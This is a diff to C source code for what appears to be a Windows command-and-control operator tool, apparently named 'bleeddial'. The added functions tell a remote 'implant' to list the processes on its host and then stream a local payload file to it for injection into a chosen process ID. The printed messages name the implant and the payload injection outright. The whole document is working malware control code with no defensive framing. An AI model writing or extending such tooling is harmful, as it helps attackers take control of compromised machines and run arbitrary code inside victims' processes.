@@ -768,3 +768,224 @@ DWORD WINAPI thread_runcode(struct runcode_params_t* params) {
 	free(params);
 	return 0;
 }
+
+int _est_pst32_thread(endpoint_id_t endpoint_id,
+					  tremont_stream_id* stream_id_ptr,
+					  struct bleeddial_ctx_t* ctx) {
+
+	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
+
+	tremont_stream_id stream;
+
+	_req_new_thread(endpoint_id,
+		stream_id_ptr,
+		ctx
+	);
+	stream = *stream_id_ptr;
+
+	struct wrkr_msg_t req;
+	memset(&req, 0, sizeof(req));
+	req.msg_enum = PS_T32;
+
+	struct pst32_msg_t* pst32_msg;
+	pst32_msg = &req.pst32;
+	pst32_msg->msg_enum = REQ;
+
+	struct pst32_req_t* pst32_req;
+	pst32_req = &pst32_msg->req;
+
+	tremont_send(stream, (byte*)&req, sizeof(req), nexus);
+
+	struct wrkr_msg_t res;
+	tremont_recv(stream, (byte*)&res, sizeof(res), nexus);
+
+	return res.pst32.res.proc_count;
+}
+
+DWORD WINAPI thread_pst32(struct pst32_params_t* params) {
+	uint32_t proc_count;
+	struct wrkr_msg_t msg;
+	tremont_stream_id stream;
+	struct _pst32_proc_t* procs;
+
+	printf("Requesting Tlhelp32 process enumeration...\n");
+
+	proc_count = _est_pst32_thread(params->endpoint_id,
+		&stream,
+		params->ctx
+	);
+
+	if (proc_count == 0) {
+		printf("Unable to enumerate processes!\n");
+	}
+
+	procs = calloc(proc_count, sizeof(*procs));
+	if (!procs) {
+		printf("Couldn't allocate memory for procs!\n");
+		goto END;
+	}
+	
+	tremont_recv(stream, (byte*)procs, proc_count * sizeof(*procs), 
+		params->ctx->transport_pcb->nexus);
+
+	printf("Exe name          PID\n");
+	for (int i = 0; i < proc_count; i++)
+		wprintf(L"%s          %d\n", procs[i].exe_name, 
+			procs[i].proc_id);
+
+END:
+	tremont_recv(stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_enum = PS_T32;
+	msg.runcode.fak.sanity = 1;
+	tremont_send(stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+
+	free(procs);
+	free(params);
+	return 0;
+}
+
+int _est_inject_thread(endpoint_id_t endpoint_id,
+	int64_t file_len,
+	uint32_t pid,
+	tremont_stream_id* stream_id_ptr,
+	struct bleeddial_ctx_t* ctx) {
+
+	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
+
+	tremont_stream_id stream;
+
+	_req_new_thread(endpoint_id,
+		stream_id_ptr,
+		ctx
+	);
+	stream = *stream_id_ptr;
+
+	struct wrkr_msg_t req;
+	memset(&req, 0, sizeof(req));
+	req.msg_enum = INJECT;
+
+	struct inject_msg_t* inject_msg;
+	inject_msg = &req.inject;
+	inject_msg->msg_enum = REQ;
+
+	struct inject_req_t* inject_req;
+	inject_req = &inject_msg->req;
+
+	inject_req->file_len = file_len;
+	inject_req->pid = pid;
+
+	tremont_send(stream, (byte*)&req, sizeof(req), nexus);
+
+	struct wrkr_msg_t res;
+	tremont_recv(stream, (byte*)&res, sizeof(res), nexus);
+
+	return res.inject.res.allowed == 1 ? 0 : -1;
+}
+
+DWORD WINAPI thread_inject(struct inject_params_t* params) {
+	char alias_buf[255] = { 0 };
+	int res = -1;
+
+	EnterCriticalSection(&params->ctx->endpoint_db_cs);
+	res = endpoint_id_alias(alias_buf,
+		sizeof(alias_buf),
+		params->endpoint_id,
+		params->ctx->endpoint_db
+	);
+	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
+	if (res == -1)
+		printf("Uploading payload to implant %d...\n",
+			params->endpoint_id);
+	else
+		printf("Uploading payload to %s (%d)...\n",
+			alias_buf,
+			params->endpoint_id);
+
+	HANDLE file_handle;
+	file_handle = CreateFileA(params->local_path,
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+	if (file_handle == INVALID_HANDLE_VALUE) {
+		printf("Can't access file on local machine\n");
+		return -1;
+	}
+
+	int64_t file_len;
+	GetFileSizeEx(file_handle, (PLARGE_INTEGER)&file_len);
+
+	tremont_stream_id stream;
+	res = _est_inject_thread(params->endpoint_id,
+		file_len,
+		params->target_pid,
+		&stream,
+		params->ctx
+	);
+	if (res == -1) {
+		printf("Couldn't allocate enough memory on implant\n");
+		return -1;
+	}
+
+	BOOL can_read = FALSE;
+	int64_t total_sent = 0;
+	int read_from_file = 0;
+	char temp_buf[255];
+
+	while (total_sent < file_len) {
+		ReadFile(file_handle,
+			temp_buf,
+			sizeof(temp_buf),
+			&read_from_file,
+			NULL
+		);
+		tremont_send(
+			stream,
+			temp_buf,
+			read_from_file,
+			params->ctx->transport_pcb->nexus
+		);
+		total_sent += read_from_file;
+	}
+	printf("Upload complete!\n");
+
+	struct wrkr_msg_t msg;
+	tremont_recv(stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+
+	if (alias_buf[0] == 0)
+		printf("Implant %d injecting payload...\n",
+			params->endpoint_id);
+	else
+		printf("%s (%d) injecting payload...\n",
+			alias_buf,
+			params->endpoint_id);
+
+	tremont_recv(stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_enum = INJECT;
+	msg.inject.fak.sanity = 1;
+	tremont_send(stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+
+	if (alias_buf[0] == 0)
+		printf("Payload injected on Implant %d!\n",
+			params->endpoint_id);
+	else
+		printf("Payload injected on %s (%d)!\n",
+			alias_buf,
+			params->endpoint_id);
+
+	CloseHandle(file_handle);
+	free(params);
+	return 0;
+}
